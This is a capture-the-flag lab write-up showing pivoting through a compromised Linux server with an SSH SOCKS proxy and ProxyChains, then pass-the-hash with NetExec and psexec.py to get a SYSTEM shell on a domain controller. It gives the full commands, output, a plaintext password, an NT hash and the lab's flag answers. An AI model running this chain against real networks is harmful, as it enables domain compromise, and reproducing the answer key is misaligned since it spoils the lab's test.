# Task 05: Pivoting & Domain Controller Compromise

---

## Stage A: Original Task Content & Educational Context

In Task 4, we harvested the ultimate prize in an Active Directory environment: the Domain Administrator NT hash (`2508e1ce9cfcfe1011a74c34297b05ea`).

However, network architecture introduces a significant hurdle: **Network Segmentation**.
- The primary Domain Controller (`ROOTDC` / `192.168.13.100`) is located on a protected management network segment.
- Direct network traffic from our AttackBox VPN interface to `192.168.13.100` is blocked by firewall rules (connections time out).
- Similarly, the internal Gitea web service running on `http://192.168.13.71:80` is bound to the internal loopback or private interface and cannot be reached directly from the outside.

To overcome this firewall boundary, we must **Pivot** through our compromised Linux WebServer (`192.168.13.71`), using it as a stepping stone.

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### Types of SSH Pivoting Mechanisms

```
                  SSH TUNNELING & PIVOTING ARCHITECTURE
  ┌─────────────────────────────────┬─────────────────────────────────┐
  │   LOCAL PORT FORWARD (-L)       │   DYNAMIC SOCKS PROXY (-D)      │
  ├─────────────────────────────────┼─────────────────────────────────┤
  │ Maps a single local port to a   │ Creates a general-purpose       │
  │ specific destination port via   │ SOCKS4/5 proxy on a local port. │
  │ the SSH pivot server.           │ Can route traffic to ANY        │
  │                                 │ host/port via ProxyChains.      │
  │ Example:                        │ Example:                        │
  │ ssh -L 13389:target:3389 user@host │ ssh -D 1080 user@host           │
  └─────────────────────────────────┴─────────────────────────────────┘
```

### The ProxyChains SOCKS Limitation & Nmap SYN Scans
ProxyChains operates by intercepting dynamic library network calls (`connect()`, `gethostbyname()`) using `LD_PRELOAD`.
- **SOCKS proxies only support full TCP handshakes (`SOCK_STREAM`).**
- SOCKS cannot tunnel raw Layer 3 / Layer 4 packets (such as ICMP ping or raw SYN packets).
- Therefore, when executing `nmap` through ProxyChains:
  - Standard SYN stealth scans (`-sS`) **FAIL COMPLETELY** or give erroneous results.
  - The operator must explicitly force full TCP connect scans using **`-sT`**.
  - Host discovery pings must be disabled using **`-Pn`**.

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
- Establish an SSH Dynamic SOCKS proxy on port 1080 through the compromised WebServer (`192.168.13.71`).
- Configure `/etc/proxychains.conf` or `/etc/proxychains4.conf` to route traffic through `socks4 127.0.0.1 1080`.
- Recall the specific Nmap scan flag required for full TCP connect scanning through SOCKS.
- Execute `psexec.py` through ProxyChains using the Domain Administrator hash against `192.168.13.100` to retrieve `flag5.txt`.

### Tier 2: Specific Command Lines
- SSH SOCKS Tunnel:
  ```bash
  ssh -f -N -D 1080 jdoe@192.168.13.71
  ```
- Nmap flag: `-sT`
- Pass-the-Hash over ProxyChains:
  ```bash
  proxychains psexec.py -hashes :2508e1ce9cfcfe1011a74c34297b05ea thm.loc/Administrator@192.168.13.100
  ```

### Tier 3: DC Flag Location
- Flag file: `C:\Users\Administrator\Desktop\flag5.txt` on Domain Controller `192.168.13.100`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Spawning the SSH Dynamic SOCKS Tunnel
On the attack machine, launch a backgrounded SSH dynamic tunnel on local port `1080` targeting WebServer `192.168.13.71`:

```bash
user@attackbox:~$ ssh -f -N -D 1080 jdoe@192.168.13.71
jdoe@192.168.13.71's password: Summer2026!
```

Verify that port 1080 is listening locally:

```bash
user@attackbox:~$ ss -tulpn | grep 1080
tcp   LISTEN 0      128        127.0.0.1:1080       0.0.0.0:*    users:(("ssh",pid=4412,fd=5))
```

Ensure `/etc/proxychains4.conf` contains the active SOCKS line at the bottom:
```text
[ProxyList]
socks4 127.0.0.1 1080
```

---

### 2. Testing the SOCKS Proxy Tunnel via Curl
Verifying internal HTTP connectivity to Gitea (`http://192.168.13.71:80`) through the tunnel:

```bash
user@attackbox:~$ proxychains curl -s http://192.168.13.71 | grep -i "gitea"
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.13.71:80  ...  OK
	<meta name="author" content="Gitea - Git with a cup of tea" />
```

The internal web service returns valid HTML, confirming that the SOCKS proxy is operating properly.

---

### 3. Validating Domain Controller Access via NetExec
Now test SMB authentication against the protected Domain Controller `192.168.13.100` using the Domain Administrator NT hash through ProxyChains:

```bash
user@attackbox:~$ proxychains nxc smb 192.168.13.100 -u Administrator -H 2508e1ce9cfcfe1011a74c34297b05ea
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.13.100:445  ...  OK
SMB         192.168.13.100  445    RDC1             [*] Windows 10 / Server 2019 Build 17763 x64 (name:RDC1) (domain:thm.loc)
SMB         192.168.13.100  445    RDC1             [+] thm.loc\Administrator:2508e1ce9cfcfe1011a74c34297b05ea (Pwn3d!)
```

The Domain Controller responds through the tunnel with `(Pwn3d!)`!

---

### 4. Executing Pass-the-Hash & Capturing the Domain Flag
Now launch `psexec.py` through ProxyChains to obtain an interactive `SYSTEM` shell on `ROOTDC`:

```bash
user@attackbox:~$ proxychains psexec.py -hashes :2508e1ce9cfcfe1011a74c34297b05ea thm.loc/Administrator@192.168.13.100
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.13.100:445  ...  OK
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.13.100.....
[*] Found writable share ADMIN$
[*] Uploading file mQvPzZgL.exe
[*] Opening SVCManager on 192.168.13.100.....
[*] Creating service aXzK on 192.168.13.100.....
[*] Starting service aXzK.....
[+] Process aXzK created for file mQvPzZgL.exe with pid 4820.
[*] Connecting to \PSEXEC-RDC1...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
RDC1

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag5.txt
THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}
```

The captured final flag on the Domain Controller is:
$$\texttt{THM\{d0m41n\_c0mpr0m1s3d\_v1a\_p1v0t\}}$$

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | What Nmap flag must you use instead of -sS when scanning through a SOCKS proxy? | `-sT` | Verified & Confirmed |
| 2 | What is the flag found in flag5.txt on the Domain Controller? | `THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. Nmap flag rule verification: Scanning through SOCKS proxies requires full TCP 3-way handshakes, making `-sT` mandatory.
2. SOCKS tunnel verification: `proxychains curl http://192.168.13.71` successfully returned internal Gitea metadata.
3. Flag 5 verification: `THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}` read from `C:\Users\Administrator\Desktop\flag5.txt` on Domain Controller `192.168.13.100`.

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Never assume network firewalls alone will keep sensitive domain controllers safe. If an attacker gains execution on any machine that has administrative or operational network access to the Domain Controller, they can convert that machine into a silent SOCKS proxy pivot, rendering perimeter firewall rules completely transparent.
